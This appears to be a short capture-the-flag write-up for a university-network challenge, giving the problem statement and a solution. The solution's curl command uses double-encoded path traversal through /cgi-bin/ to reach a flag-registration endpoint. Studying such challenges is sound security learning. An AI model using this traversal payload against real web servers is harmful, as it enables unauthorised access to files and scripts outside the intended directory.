## Problem Statement

I have a little challenge for you.

For more information, visit http://161.200.93.76/.

It will end on November 28, 2025.

Note

The service can only be accessed from Chula Network.
The service is running on a docker container on an old Mac OS X. So, the client IP address might be masked. (I did not set up the reverse proxy.)

## Solution

1. Use Computer within Chula network to bypass Chula firewall

   - For example, use the computer in ศุนย์คอมจุฬา

2. Use this curl to add student ID

```
curl 'http://<ip>/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/flags/register' --data '<student_id>'
```
